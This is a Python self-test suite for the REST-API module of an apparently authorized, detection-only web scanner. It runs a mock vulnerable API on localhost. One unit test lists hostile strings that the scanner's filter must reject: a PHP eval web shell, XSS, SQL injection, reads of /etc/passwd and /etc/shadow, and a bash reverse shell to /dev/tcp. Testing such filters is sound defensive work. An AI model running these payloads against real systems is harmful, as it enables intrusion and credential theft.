#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
=============================================================================
 WASP P17 SELF-TEST SUITE - mod_api.py v17.0.0 FULL ULTRA PRO MAX (P17)
=============================================================================
 Mock REST-API lab + full assertion suite:
   - Unit tests (INERT payload libs / spec parser / auth classifier /
     FORBIDDEN_CONTENT_PATTERNS enforcement + evil-payload rejects)
   - Discovery unit (P5/P3/P11/P15/P16/P2/P7/P8 seed mining + cold pool)
   - Active run e2e gate-OFF (stages A..L: spec/auth/version/rate/mass/
     error/method/proto) + RoE-gate-skip documentation
   - Gated run (rate burst 429-stop + mass-write canary + bola canary +
     XFF window hint)
   - Artifact integrity (26+ outputs, matrix >=90 rows, chains >=11)
   - RWX rule (0777 on every result file) + zero-external-egress
   - REDACTION check (bodies sirf len/sha1 - content stored nahi hota)
   - Passive mode (allow_active=False -> 0 probes) + checkpoint replay
   - CLI + import hygiene (-W error clean)
 Detection-only discipline honored: lab me bhi koi exploit payload nahi.
=============================================================================
"""
# --- WASP v2.2 layout bootstrap (auto-inserted: phases/<block> paths) ---
import os as _wasp_os, sys as _wasp_sys
_WASP_ROOT = _wasp_os.path.dirname(_wasp_os.path.dirname(_wasp_os.path.abspath(__file__)))
_WASP_PHASE = _wasp_os.path.join(_WASP_ROOT, "phases", "block4_api_logic")
for _wasp_p in (_WASP_ROOT, _WASP_PHASE):
    if _wasp_p not in _wasp_sys.path:
        _wasp_sys.path.insert(0, _wasp_p)
# --- end bootstrap ---

import os
import io
import re
import sys
import json
import shutil
import hashlib
import contextlib
import threading
import subprocess
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlsplit, parse_qs

HERE = os.path.dirname(os.path.abspath(__file__))
ULTRA = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                     "phases", "block4_api_logic")
sys.path.insert(0, ULTRA)
sys.path.insert(0, HERE)

import mod_api as MA                                           # noqa: E402
import wasp_core as WC                                         # noqa: E402

BASE = os.path.join(HERE, "p17_test_base")
BASE_GATED = os.path.join(HERE, "p17_test_base_gated")
BASE2 = os.path.join(HERE, "p17_test_base_passive")
ENG = "p17lab"
ENG_G = "p17lab2"
ENG_P = "p17labp"

PASS, FAIL = [], []


def check(name, cond, detail=""):
    if cond:
        PASS.append((name, ""))
        print("  [PASS] %s" % name)
    else:
        FAIL.append((name, detail))
        print("  [FAIL] %s -> %s" % (name, str(detail)[:120]))


# ===========================================================================
# MOCK REST API LAB (detection-only sim - sab responses INERT)
# ===========================================================================
LAB = {"uget": 0, "posts": [], "burst": []}
NF_BODY = json.dumps({"error": "not found", "code": "resource_missing"})


def _j(self, code, obj, hdrs=None):
    b = json.dumps(obj).encode("utf-8")
    self.send_response(code)
    self.send_header("Content-Type", "application/json")
    self.send_header("Content-Length", str(len(b)))
    for k, v in (hdrs or {}).items():
        self.send_header(k, v)
    self.end_headers()
    self.wfile.write(b)


def _txt(self, code, s, ct="text/plain", hdrs=None):
    b = s.encode("utf-8")
    self.send_response(code)
    self.send_header("Content-Type", ct)
    self.send_header("Content-Length", str(len(b)))
    for k, v in (hdrs or {}).items():
        self.send_header(k, v)
    self.end_headers()
    self.wfile.write(b)


class LabHandler(BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def _read_body(self):
        ln = int(self.headers.get("Content-Length", 0) or 0)
        return self.rfile.read(ln) if ln else b""

    def do_GET(self):
        p = urlsplit(self.path).path
        q = parse_qs(urlsplit(self.path).query)
        origin = "http://127.0.0.1:%d" % self.server.server_address[1]
        # rate-limit sim: /api/v1/users par UNMARKED flood (burst) ke liye
        # 429 - marked probe requests (X-WASP-Probe) kabhi 429 nahi hote
        # (lab-isolation rule: census/auth/debug marked hote hain, burst
        # plain hota hai -> sirf burst ko 429 milta hai, threshold 20)
        if p == "/api/v1/users":
            LAB["uget"] = LAB.get("uget", 0) + 1
            marked = bool(self.headers.get("X-WASP-Probe"))
            if LAB["uget"] > 20 and not marked:
                return _j(self, 429, {"error": "too many requests"},
                          {"Retry-After": "0"})
            return _j(self, 200, {"data": [
                {"id": 1, "email": "u1@wasp-lab.invalid", "role": "user"},
                {"id": 2, "email": "u2@wasp-lab.invalid", "role": "admin"}],
                "canary": "waspP17LAB"})
        if p == "/api/v2/users":
            return _j(self, 401, {"error": "unauthorized"},
                      {"WWW-Authenticate": "Bearer",
                       "X-RateLimit-Limit": "100",
                       "X-RateLimit-Remaining": "99",
                       "X-RateLimit-Reset": "1600000000"})
        if p == "/api/v1/admin/config":
            return _j(self, 401, {"error": "unauthorized"},
                      {"WWW-Authenticate": "Bearer"})
        if p == "/api/v1/profile":
            tok = self.headers.get("Authorization")
            if not tok:
                return _j(self, 401, {"error": "token required"},
                          {"WWW-Authenticate": "Bearer"})
            return _j(self, 200, {"id": 9, "name": "waspP17LABp",
                                  "role": "user", "authz": "none"})
        if p.startswith("/api/v1/users/"):
            return _j(self, 200, {"id": p.rsplit("/", 1)[-1],
                                  "email": "x@wasp-lab.invalid",
                                  "role": "user"})
        if p in ("/api/v1/orders/123", "/api/v1/invoices/42"):
            return _j(self, 401, {"error": "unauthorized"})
        if p == "/api/xml":
            return _j(self, 401, {"error": "unauthorized"})
        if p == "/api/v1/debug":
            if "debug" in q or "trace" in q or "pretty" in q:
                return _txt(self, 200, "DEBUG MODE enabled waspP17LABd "
                            "sql=select 1 path=/app/api internal=10.0.0.9")
            return _j(self, 405, {"error": "POST malformed json here"})
        if p == "/openapi.json":
            return _j(self, 200, SPEC_DOC)
        if p == "/graphql":
            return _txt(self, 400, '{"errors":[{"message":"graphql: query '
                        'required"}]}', ct="application/json")
        if p == "/ws":
            up = (self.headers.get("Upgrade") or "").lower()
            if up == "websocket":
                return _txt(self, 426, "Upgrade Required",
                            {"Connection": "Upgrade", "Upgrade": "websocket"})
            return _j(self, 404, {"error": "not found"})
        return _j(self, 404, {"error": "not found", "code": "resource_missing"})

    def do_POST(self):
        p = urlsplit(self.path).path
        body = self._read_body()
        LAB.setdefault("posts", []).append({"path": p, "len": len(body)})
        override = (self.headers.get("X-HTTP-Method-Override") or "").upper()
        if override == "PATCH":
            return _j(self, 200, {"overridden": True, "method": "PATCH"})
        if p == "/api/v1/users":
            try:
                obj = json.loads(body.decode("utf-8", "ignore"))
                if not isinstance(obj, dict):
                    raise ValueError("not dict")
            except Exception:
                return _j(self, 400, {"error": "invalid json body"})
            echo = dict(obj)
            return _j(self, 201, {"status": "created", "received": echo,
                                  "id": 77})
        if p == "/api/v1/debug":
            try:
                json.loads(body.decode("utf-8", "ignore"))
            except Exception:
                trace = ('Traceback (most recent call last):\n'
                         '  File "/app/api.py", line 42, in handler\n'
                         '    return json.loads(payload)\n'
                         'json.decoder.JSONDecodeError: Expecting value\n')
                return _txt(self, 500, trace, ct="text/html",
                            hdrs={"Server": "wasp-lab/1.0",
                                  "X-Powered-By": "Express"})
            return _j(self, 200, {"ok": True})
        if p == "/graphql":
            try:
                obj = json.loads(body.decode("utf-8", "ignore"))
            except Exception:
                return _txt(self, 400, '{"errors":[{"message":"bad query"}]}',
                            ct="application/json")
            if "__typename" in str(obj.get("query", "")):
                return _j(self, 200, {"data": {"__typename": "Query"}})
            return _txt(self, 200, '{"data":{},"extensions":{"graphql":true}}',
                        ct="application/json")
        return _j(self, 404, {"error": "not found", "code": "resource_missing"})

    def do_OPTIONS(self):
        p = urlsplit(self.path).path
        allow = "GET, POST, PATCH, DELETE, OPTIONS"
        if p == "/api/v2/users":
            allow = "GET, OPTIONS"
        return _txt(self, 204, "", hdrs={"Allow": allow,
                                         "Access-Control-Allow-Methods": allow})


SPEC_DOC = {
    "openapi": "3.0.1",
    "info": {"title": "WASP Lab API",
             "description": "Internal contact: admin@wasp-lab.invalid "
                            "(staging host 10.0.0.5 / dev.local)"},
    "servers": [{"url": "http://10.0.0.5:8080"}],
    "components": {"securitySchemes": {
        "bearerAuth": {"type": "http", "scheme": "bearer"}}},
    "paths": {
        "/api/v1/users": {
            "get": {"operationId": "listUsers",
                    "security": [{"bearerAuth": []}],
                    "parameters": [{"name": "limit", "in": "query",
                                    "required": False}]},
            "post": {"requestBody": {"content": {"application/json": {
                "schema": {"type": "object", "properties": {
                    "name": {"type": "string"},
                    "email": {"type": "string"},
                    "role": {"type": "string"},
                    "is_admin": {"type": "boolean"}}}}}}}},
        "/api/v1/users/{id}": {
            "get": {"operationId": "getUser",
                    "security": [{"bearerAuth": []}]}},
        "/api/v1/admin/config": {
            "get": {"deprecated": True, "operationId": "getAdminConfig",
                    "security": [{"bearerAuth":[]}]}},
        "/api/v2/users": {
            "get": {"operationId": "listUsersV2",
                    "security": [{"bearerAuth": []}]}},
        "/api/v1/internal/health": {
            "get": {"operationId": "healthz"}}}}


def _start_lab():
    srv = ThreadingHTTPServer(("127.0.0.1", 0), LabHandler)
    port = srv.server_address[1]
    th = threading.Thread(target=srv.serve_forever, daemon=True)
    th.start()
    return srv, port



# ===========================================================================
# SEED FIXTURES (P5/P3/P11/P15/P16/P2/P7/P8 artifacts)
# ===========================================================================
def _w(base, sub, name, content):
    d = os.path.join(base, sub)
    os.makedirs(d, exist_ok=True)
    p = os.path.join(d, name)
    os.makedirs(os.path.dirname(p), exist_ok=True)
    with open(p, "w", encoding="utf-8") as f:
        if isinstance(content, str):
            f.write(content)
        else:
            json.dump(content, f, indent=1)
    os.chmod(p, 0o777)
    return p


def _seed(base, eng, origin):
    if os.path.isdir(os.path.join(base, eng)):
        shutil.rmtree(os.path.join(base, eng))
    os.makedirs(os.path.join(base, eng), exist_ok=True)
    _w(base, "", "scope.json", {
        "authorized": True, "engagement": eng,
        "authorization_reference": "P17 selftest SOW v1",
        "targets": [origin],
        "notes": "no-DoS; detection-only INERT lab; burst gate lab-only"})
    # ---- P5 content (guide seed: api artifacts + openapi/swagger) ----
    _w(base, eng, "content/api_endpoints.txt", "\n".join([
        origin + "/api/v1/users", origin + "/api/v1/admin/config",
        origin + "/api/v1/profile", origin + "/api/v1/debug"]) + "\n")
    _w(base, eng, "content/openapi.json", SPEC_DOC)
    _w(base, eng, "content/swagger.json", SPEC_DOC)
    _w(base, eng, "content/endpoints.txt", "\n".join([
        origin + "/api/v1/users", origin + "/api/v2/users"]) + "\n")
    # ---- P3 passive (guide seed: api version matrix) ----
    _w(base, eng, "passive/api_version_matrix.json", {
        "versions": [
            {"url": origin + "/api/v2/users", "status": "live",
             "note": "v2 current"},
            {"url": origin + "/api/v1/users", "status": "live",
             "note": "v1 legacy"}]})
    _w(base, eng, "passive/api_like.txt",
       origin + "/api/v1/users\n" + origin + "/rest/v1/items\n")
    # ---- P11 access (guide seed: idor endpoints) ----
    _w(base, eng, "access/access_endpoints.txt", "\n".join([
        origin + "/api/v1/orders/123", origin + "/api/v1/invoices/42",
        origin + "/api/v1/users/{id}"]) + "\n")
    _w(base, eng, "access/batch_idor.json", [
        {"endpoint": origin + "/api/v1/invoices/42", "status": "suspected"},
        {"endpoint": origin + "/api/v1/orders/123", "status": "suspected"}])
    # ---- P15 ssrf feedforward (to_phase17_api) ----
    _w(base, eng, "ssrf/feedforward.json", {"routing": {
        "to_phase17_api": {
            "xml_api_endpoints": [origin + "/api/xml"],
            "fetch_params": ["url"]}}})
    # ---- P16 files feedforward (to_phase17) ----
    _w(base, eng, "files/feedforward.json", {"routing": {
        "to_phase17": {"xml_api_endpoints": [origin + "/api/xml"]}}})
    # ---- P2/P7/P8 ----
    _w(base, eng, "understand/params.json", {
        "params": [{"url": origin + "/api/v1/users",
                    "params": ["limit", "offset"]}]})
    _w(base, eng, "js/js_hints.txt", "fetch('/api/v2/users')\n"
       "apiBase='/api'\n")
    _w(base, eng, "surface/priority_queue.json", {
        "queue": [{"url": origin + "/api/v1/admin/config",
                   "score": 90},
                  {"url": origin + "/api/v1/debug",
                   "score": 85}]})


# ===========================================================================
# UNIT TESTS
# ===========================================================================
def unit_payloads():
    print("\n== UNIT: payload libs ==")
    c = MA._canary("ut")
    check("canary family", c.startswith("waspP17"), c)
    b = MA.inert_json_body({"name": c}, c)
    check("inert body canary", c.encode() in b)
    MA.assert_inert(b, "ut")
    nb = MA.inert_nested_body(c)
    check("nested body depth", json.loads(nb)["profile"]["role"] == c + "user")
    toks = MA.invalid_token_pool(c)
    check("token pool >= 6", len(toks) >= 6, len(toks))
    check("tokens all invalid/synthetic",
          all(t is None or ("waspP17" in t or "invalid" in t or
                            t.startswith(("eyJ", "Basic")) or
                            len(t) > 24)
              for _, t in toks), str(toks)[:80])
    for role, tok in toks:
        if tok:
            MA.assert_inert(tok.encode(), "token-" + role)
    mv = MA.malformed_json_variants(c)
    check("malformed variants 6", len(mv) == 6, len(mv))
    for body, label in mv:
        MA.assert_inert(body, "malformed-" + label)
    check("sensitive census 20+", len(MA.SENSITIVE_FIELDS) >= 20)
    check("mass fields 12+", len(MA.MASS_ASSIGN_FIELDS) >= 12)
    check("rate headers 10+", len(MA.RATE_LIMIT_HEADERS) >= 10)
    check("api path pool 20+", len(MA.API_PATH_POOL) >= 20)
    check("spec path pool 16+", len(MA.SPEC_PATH_POOL) >= 16)


def unit_inert_safety():
    print("\n== UNIT: INERT enforcement (crown discipline) ==")
    evil = [
        b"<?php eval($_POST['x']); ?>",
        b"{{7*7}}<script>alert(1)</script>",
        b"../../etc/passwd",
        b"' UNION SELECT password FROM users--",
        b"BEGIN RSA PRIVATE KEY",
        b"AKIAIOSFODNN7EXAMPLE",
        b"system('cat /etc/shadow')",
        b"document.cookie",
        b"bash -i >& /dev/tcp/10.0.0.1/4444",
    ]
    for e in evil:
        try:
            MA.assert_inert(e, "evil-test")
            check("evil blocked: %s" % e[:18], False, "NOT blocked")
        except ValueError:
            check("evil blocked: %s" % e[:18], True)
    for body, _ in MA.malformed_json_variants("waspP17x"):
        MA.assert_inert(body, "ok")
    check("clean bodies pass", True)
    sig = MA.filesig(b"waspP17-signature-test")
    check("filesig redacted", sig["content_stored"] is False and
          sig["len"] == 22 and len(sig["sha1_12"]) == 12)


def unit_spec_parser():
    print("\n== UNIT: openapi parser ==")
    spec = MA.parse_openapi_spec(SPEC_DOC, "http://127.0.0.1/openapi.json")
    check("spec version", spec["spec_version"] == "3.0.1", spec)
    check("spec paths 5", spec["paths_count"] == 5, spec["paths_count"])
    check("spec ops >= 6", len(spec["endpoints"]) >= 6,
          len(spec["endpoints"]))
    check("spec security schemes", len(spec["security_schemes"]) == 1)
    check("spec internal hosts", len(spec["internal_hosts"]) >= 1,
          spec["internal_hosts"])
    check("spec emails", len(spec["emails"]) >= 1, spec["emails"])
    check("spec deprecated", any(e["deprecated"] for e in spec["endpoints"]))
    wf = spec.get("writable_fields") or {}
    check("spec writable fields", any("role" in v for v in wf.values()), wf)
    check("spec auth paths", len(spec["requires_auth_paths"]) >= 4)
    check("spec servers", len(spec["servers"]) >= 1)
    bad = MA.parse_openapi_spec({"not": "spec"}, "x")
    check("spec reject non-spec", bad is None)


def unit_auth_classifier():
    print("\n== UNIT: auth classifier ==")
    v, m, s = MA.classify_auth([
        {"role": "anon", "status": 200, "len": 200, "ct": "application/json"},
        {"role": "invalid-bearer", "status": 200, "len": 200,
         "ct": "application/json"}], "c")
    check("auth-missing CONFIRMED", v == "CONFIRMED" and m == "auth-missing",
          (v, m))
    v, m, _ = MA.classify_auth([
        {"role": "anon", "status": 200, "len": 10, "ct": "application/json"},
        {"role": "invalid-bearer", "status": 401, "len": 30,
         "ct": "application/json"}], "c")
    check("anon-200 SUSPECTED", v == "SUSPECTED", (v, m))
    v, m, _ = MA.classify_auth([
        {"role": "anon", "status": 401, "len": 30, "ct": "application/json"},
        {"role": "invalid-bearer", "status": 401, "len": 30,
         "ct": "application/json"}], "c")
    check("consistent HARDENED", v == "HARDENED" and m == "consistent-401/403",
          (v, m))
    v, m, _ = MA.classify_auth([
        {"role": "anon", "status": 401, "len": 30, "ct": "application/json"},
        {"role": "invalid-jwt-shape", "status": 200, "len": 80,
         "ct": "application/json"}], "c")
    check("token-not-validated CONFIRMED", v == "CONFIRMED" and
          m == "token-not-validated", (v, m))
    v, m, _ = MA.classify_auth([
        {"role": "anon", "status": 0, "len": 0, "ct": ""}], "c")
    check("probe-error NOISE", v == "NOISE", (v, m))


def unit_discovery():
    print("\n== UNIT: discovery mining ==")
    origin = LAB.get("origin") or "http://127.0.0.1:1"
    rows, meta = MA.discover_api_surface(os.path.join(BASE, ENG),
                                         _scope_stub(), {})
    srcs = meta.get("sources", [])
    for want in ("p5_api_endpoints", "p3_version_matrix",
                 "p11_access_endpoints", "p15_to_p17", "p16_to_p17",
                 "p2_params", "p7_js_hints", "p8_priority"):
        check("seed source %s" % want, want in srcs, srcs)
    urls = [r["url"] for r in rows]
    check("seeded users url", any(u.endswith("/api/v1/users") for u in urls))
    check("seeded v2 url", any(u.endswith("/api/v2/users") for u in urls))
    check("spec targets present", any(r["kind"] == "spec" for r in rows))
    check("cold pool present",
          any("/rest" in u for u in urls), urls[:6])
    check("ranked score order", rows[0]["score"] >= rows[-1]["score"])


def _scope_stub():
    class _S:
        engagement = ENG
        def seed_urls(self):
            return [LAB["origin"]]
        def describe(self):
            return "stub"
    return _S()



# ===========================================================================
# E2E - ACTIVE RUN (gates OFF)
# ===========================================================================
def e2e_gate_off(origin, out):
    print("\n== E2E gate-OFF ==")
    adir = out
    check("out dir exists", os.path.isdir(adir), adir)
    ff = _read(os.path.join(adir, "feedforward.json")) or {}
    rt = ff.get("routing") or {}
    check("ff: to_phase18_graphql", "to_phase18_graphql" in rt, list(rt))
    check("ff: gql endpoint seeded",
          any("/graphql" in u for u in rt.get("to_phase18_graphql", {})
              .get("gql_endpoints", [])), rt.get("to_phase18_graphql"))
    check("ff: to_phase19_ws", "to_phase19_ws" in rt)
    check("ff: to_phase11_bola", "to_phase11_bola" in rt)
    check("ff: to_phase12_inject", "to_phase12_inject" in rt)
    check("ff: to_phase20_logic", "to_phase20_logic" in rt)
    am = _read(os.path.join(adir, "auth_matrix.json")) or []
    check("auth matrix >= 6 endpoints", len(am) >= 6, len(am))
    conf = [a for a in am if a["verdict"] == "CONFIRMED"]
    check("auth CONFIRMED present", len(conf) >= 1,
          str([(a["url"], a["verdict"], a["model"]) for a in am])[:150])
    check("users auth-missing",
          any(a["model"] == "auth-missing" and
              a["url"].endswith("/api/v1/users") for a in conf))
    check("token-not-validated found",
          any(a["model"] == "token-not-validated" for a in conf))
    hard = [a for a in am if a["verdict"] == "HARDENED"]
    check("auth HARDENED present (v2/admin)", len(hard) >= 1,
          str([(a["url"], a["verdict"]) for a in am])[:150])
    spec = _read(os.path.join(adir, "openapi_spec_census.json")) or {}
    check("spec census paths 5", spec.get("paths_count") == 5,
          spec.get("paths_count"))
    check("spec shadow hints", len(spec.get("shadow_hints", [])) >= 1,
          spec.get("shadow_hints"))
    vm = _read(os.path.join(adir, "version_matrix.json")) or {}
    pairs = vm.get("path_pairs", [])
    check("version pairs >= 1", len(pairs) >= 1, len(pairs))
    check("v1-vs-v2 skew", any(p.get("skew") for p in pairs), pairs[:2])
    check("older_open v1", any(p.get("older_open") for p in pairs))
    rm = _read(os.path.join(adir, "rate_limit_matrix.json")) or {}
    hc = rm.get("header_census", [])
    check("rate census >= 6", len(hc) >= 6, len(hc))
    check("v2 rate headers found",
          any(r["url"].endswith("/api/v2/users") and r.get("has_limit")
              for r in hc))
    check("burst skipped (gate OFF)", rm.get("burst", {}).get("skipped")
          is True, rm.get("burst"))
    mm = _read(os.path.join(adir, "mass_assign_matrix.json")) or {}
    ma = mm.get("census", [])
    check("mass census rows >= 1", len(ma) >= 1, ma[:2])
    check("mass role_echo detected",
          any(m.get("role_echo") for m in ma), ma[:2])
    check("mass write rows present (skip doc)", len(mm.get("write_probe",
                                                           [])) >= 1)
    check("mass write skip gate",
          (mm.get("write_probe") or [{}])[0].get("gate") ==
          "api_allow_mass_write=false")
    em = _read(os.path.join(adir, "error_leak_matrix.json")) or {}
    check("stack trace detected",
          any(r.get("stack_trace") for r in em.get("malformed_body", [])),
          str(em)[:100])
    check("debug params live", len(em.get("debug_params", [])) >= 1,
          em.get("debug_params"))
    mc = _read(os.path.join(adir, "method_matrix.json")) or {}
    check("override honored detected",
          any(m.get("override_honored") for m in mc.get("method_census",
                                                        [])),
          str(mc)[:100])
    check("write methods declared finding-able",
          any("PATCH" in (m.get("methods") or []) for m in
              mc.get("method_census", [])))
    gf = _read(os.path.join(adir, "ws_gql_fingerprint.json")) or {}
    check("graphql endpoint found",
          any("/graphql" in u for u in gf.get("graphql_endpoints", [])), gf)
    check("gql typename ok",
          gf.get("gql_probe", {}).get("typename_ok") is True,
          gf.get("gql_probe"))
    check("ws signal found", len(gf.get("ws_signals", [])) >= 1,
          gf.get("ws_signals"))
    F = _read(os.path.join(adir, "findings.json")) or {}
    keys = [f["key"] for f in F.get("findings", [])]
    for want in ("api_auth_missing", "api_auth_token_not_validated",
                 "api_spec_public", "api_version_downgrade",
                 "api_mass_assign_role_field", "api_error_stack_trace",
                 "api_method_override", "api_graphql_detected",
                 "api_gate_skipped"):
        check("finding %s" % want, want in keys, keys)
    check("critical finding present",
          any(f["severity"] == "critical" for f in F.get("findings", [])),
          F.get("severity_counts"))
    mf = _read(os.path.join(adir, "MANIFEST.json")) or {}
    stats = mf.get("stats") or {}
    check("manifest matrix rows >= 90", stats.get("matrix_rows", 0) >= 90,
          stats.get("matrix_rows"))
    check("manifest chains >= 11", stats.get("chains", 0) >= 11,
          stats.get("chains"))
    check("manifest findings >= 10", stats.get("findings", 0) >= 10,
          stats.get("findings"))
    check("manifest probes > 0", stats.get("probes", 0) > 0)
    return adir


def rwx_and_egress(out, origin):
    print("\n== RWX + egress + redaction ==")
    bad_mode, n = [], 0
    for base, dirs, files in os.walk(out):
        for fn in files:
            p = os.path.join(base, fn)
            n += 1
            if (os.stat(p).st_mode & 0o777) != 0o777:
                bad_mode.append(fn)
    check("RWX all files (%d)" % n, not bad_mode, bad_mode[:5])
    adir = out
    pl = os.path.join(adir, "api_payloads")
    pat = re.compile("|".join(MA.FORBIDDEN_CONTENT_PATTERNS), re.I)
    dirty = []
    for fn in os.listdir(pl):
        with open(os.path.join(pl, fn), encoding="utf-8",
                  errors="ignore") as f:
            if pat.search(f.read()):
                dirty.append(fn)
    check("payloads 100%% INERT", not dirty, dirty)
    F = _read(os.path.join(adir, "findings.json")) or {}
    blob = json.dumps(F.get("findings", []))
    check("emails redacted in findings", "admin@wasp-lab" not in blob)
    logs = _read(os.path.join(adir, "api_probe_log.json")) or {}
    check("probe log canary family", logs.get("canary_family") == "waspP17")


# ===========================================================================
# E2E - GATED RUN (burst + mass-write + bola + xff)
# ===========================================================================
def e2e_gated(origin, out3):
    print("\n== E2E gated ==")
    adir = out3
    rm = _read(os.path.join(adir, "rate_limit_matrix.json")) or {}
    burst = rm.get("burst", {})
    check("burst ran (gated)", burst.get("skipped") is None, burst)
    check("burst throttled 429", burst.get("throttled") is True, burst)
    check("burst cap <= 15", burst.get("cap", 0) <= 15 and
          burst.get("requests", 0) <= 15, burst.get("requests"))
    check("burst retry-after captured", "retry_after" in burst, burst)
    mm = _read(os.path.join(adir, "mass_assign_matrix.json")) or {}
    mw = mm.get("write_probe", [])
    check("mass write ran", mw and mw[0].get("skipped") is None, mw[:1])
    check("mass write canary echo", any(r.get("echo") for r in mw
                                        if isinstance(r, dict)), mw[:2])
    bm = _read(os.path.join(adir, "bola_matrix.json")) or {}
    check("bola ran (gated)", bm.get("skipped") is None, bm)
    check("bola canary 200", any(r.get("canary_status") == 200
                                 for r in bm.get("rows", [])), bm.get("rows"))
    check("bola canary family", all("waspP17" in r.get("canary_url", "")
                                    for r in bm.get("rows", [])))
    check("xff window probes", len(rm.get("window_hint", {}).get("probes",
                                                                [])) >= 1,
          rm.get("window_hint"))
    F = _read(os.path.join(adir, "findings.json")) or {}
    keys = [f["key"] for f in F.get("findings", [])]
    check("gated finding bola_canary_readable", "api_bola_canary_readable"
          in keys, keys)


# ===========================================================================
# PASSIVE + REPLAY + MATRIX/CHAINS + CLI
# ===========================================================================
def passive_and_replay(cfg, cfg4, base, base2, eng, eng_p, origin):
    print("\n== passive + checkpoint replay ==")
    adir = os.path.join(base, eng, "api")
    tgt_before = _read_txt(os.path.join(adir, "api_targets.txt")) or ""
    am_before = _read(os.path.join(adir, "auth_matrix.json")) or []
    scope2 = WC.Scope(os.path.join(base, "scope.json"))
    out1b = MA.run(cfg, scope2, base)
    adir2 = out1b
    tgt_after = _read_txt(os.path.join(adir2, "api_targets.txt")) or ""
    am_after = _read(os.path.join(adir2, "auth_matrix.json")) or []
    check("replay: targets stable", tgt_before == tgt_after and
          len(tgt_before.splitlines()) > 5)
    check("replay: auth matrix stable", len(am_before) == len(am_after) and
          len(am_before) >= 6, (len(am_before), len(am_after)))
    scope4 = WC.Scope(os.path.join(base2, "scope.json"))
    out4 = MA.run(cfg4, scope4, base2)
    logs = _read(os.path.join(out4, "api_probe_log.json")) or {}
    check("passive: 0 probes", (logs.get("probes_total") or 0) == 0,
          logs.get("probes_total"))
    ff = _read(os.path.join(out4, "feedforward.json")) or {}
    check("passive ff mode", "passive" in json.dumps(ff)[:400])
    check("passive auth matrix empty",
          os.path.exists(os.path.join(out4, "auth_matrix.json")))


def matrix_and_chains(out):
    print("\n== technique matrix + chains + catalog ==")
    adir = out
    tm = _read(os.path.join(adir, "technique_matrix_api.json")) or {}
    rows = tm.get("rows", [])
    check("matrix rows >= 90", len(rows) >= 90, len(rows))
    fams = set(r["family"] for r in rows)
    for want in ("SPEC", "AUTH", "VER", "RATE", "MASS", "BOLA", "ERR",
                 "METH", "PROTO", "MANUAL"):
        check("matrix family %s" % want, want in fams, fams)
    safety = set(str(r.get("safety", "")) for r in rows)
    check("gated rows documented",
          any("GATED" in s for s in safety), safety)
    check("manual rows documented",
          any("MANUAL-ONLY" in s for s in safety))
    chains_txt = _read_txt(os.path.join(adir, "api_chains.txt")) or ""
    nch = len([l for l in chains_txt.splitlines() if l.strip()])
    check("chains >= 11", nch >= 11, nch)
    cwe = _read(os.path.join(adir, "cwe_map_api.json")) or {}
    check("cwe map >= 20 keys", len(cwe) >= 20, len(cwe))
    check("cwe api1 mapped", any("OWASP-API1" in v for v in cwe.values()))
    mitre = _read(os.path.join(adir, "mitre_map_api.json")) or {}
    check("mitre >= 8 keys", len(mitre) >= 8, len(mitre))
    cat = _read_txt(os.path.join(adir, "TECHNIQUES_CATALOG_API.md")) or ""
    check("catalog 96 techniques", "96 techniques" in cat)
    check("catalog gates listed", "api_allow_rate_burst" in cat)
    ex = _read_txt(os.path.join(adir, "EXEC_SUMMARY.md")) or ""
    check("exec summary auth line", "Auth matrix" in ex)
    plan = _read_txt(os.path.join(adir, "api_test_plan.md")) or ""
    check("test plan waves", plan.count("- [ ]") >= 1)
    hyp = _read(os.path.join(adir, "api_hypotheses.json")) or {}
    check("hypotheses >= 3", hyp.get("count", 0) >= 3, hyp.get("count"))


def cli_and_hygiene():
    print("\n== CLI + hygiene ==")
    r = subprocess.run([sys.executable, "-W", "error", "-c",
                        "import sys; sys.path.insert(0, '%s'); "
                        "import mod_api; print(mod_api.PLAN_VERSION)" % ULTRA],
                       capture_output=True, text=True, timeout=60)
    check("import -W error clean", r.returncode == 0, r.stderr[:160])
    check("version string 17.0.0", "17.0.0" in (r.stdout or ""), r.stdout)
    r2 = subprocess.run([sys.executable, os.path.join(ULTRA, "mod_api.py")],
                        capture_output=True, text=True, timeout=60)
    check("cli banner", "Phase 17 - REST API" in (r2.stdout or ""),
          r2.stdout[:120])
    check("cli gates doc", "api_allow_rate_burst" in (r2.stdout or ""))
    srcp = os.path.join(ULTRA, "mod_api.py")
    with open(srcp, encoding="utf-8") as f:
        src = f.read()
    check("module canary family", "waspP17" in src)
    check("module gates 6", all(g in src for g in (
        "api_allow_rate_burst", "api_allow_mass_write", "api_allow_bola",
        "api_allow_method_write", "api_allow_header_window")))
    check("write-gate discipline", "force_write=True" in src and
          "assert_inert" in src)


def _read(p):
    try:
        with open(p, encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return None


def _read_txt(p):
    try:
        with open(p, encoding="utf-8") as f:
            return f.read()
    except Exception:
        return None


# ===========================================================================
# MAIN
# ===========================================================================
def main():
    print("=" * 69)
    print(" WASP P17 SELF-TEST - mod_api.py v%s" % MA.PLAN_VERSION)
    print("=" * 69)
    srv, port = _start_lab()
    origin = "http://127.0.0.1:%d" % port
    LAB["origin"] = origin
    try:
        _seed(BASE, ENG, origin)
        _seed(BASE_GATED, ENG_G, origin)
        _seed(BASE2, ENG_P, origin)

        unit_payloads()
        unit_inert_safety()
        unit_spec_parser()
        unit_auth_classifier()
        unit_discovery()

        cfg = WC.Cfg(None)
        cfg.adaptive_throttle = False
        cfg.allow_active = True
        LAB.clear()
        LAB["origin"] = origin
        scope = WC.Scope(os.path.join(BASE, "scope.json"))
        out = MA.run(cfg, scope, BASE)
        e2e_gate_off(origin, out)
        rwx_and_egress(out, origin)

        cfg2 = WC.Cfg(None)
        cfg2.adaptive_throttle = False
        cfg2.allow_active = True
        cfg2.api_allow_rate_burst = True
        cfg2.api_allow_mass_write = True
        cfg2.api_allow_bola = True
        cfg2.api_allow_header_window = True
        cfg2.api_allow_method_write = True
        LAB.clear()
        LAB["origin"] = origin
        scope3 = WC.Scope(os.path.join(BASE_GATED, "scope.json"))
        out3 = MA.run(cfg2, scope3, BASE_GATED)
        e2e_gated(origin, out3)

        cfg4 = WC.Cfg(None)
        cfg4.adaptive_throttle = False
        cfg4.allow_active = False
        LAB.clear()
        LAB["origin"] = origin
        passive_and_replay(cfg, cfg4, BASE, BASE2, ENG, ENG_P, origin)

        matrix_and_chains(out)
        cli_and_hygiene()
    finally:
        srv.shutdown()
